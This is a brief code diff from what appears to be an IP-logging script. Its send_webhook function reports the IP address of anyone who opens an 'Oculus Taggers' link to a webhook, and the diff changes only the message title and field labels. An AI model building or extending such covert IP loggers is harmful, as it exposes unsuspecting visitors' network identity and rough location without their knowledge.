@@ -28,11 +28,11 @@ def send_webhook(ip):
         "username": "Oculus Taggers",
         "embeds": [
             {
-                "title": "🔗 Link Opened",
+                "title": "Damn Son.",
                 "description": "Someone opened the Oculus Taggers link.",
                 "fields": [
                     {
-                        "name": "🌐 IP Address",
+                        "name": "IP Address",
                         "value": f"`{ip}`",
                         "inline": False
                     }
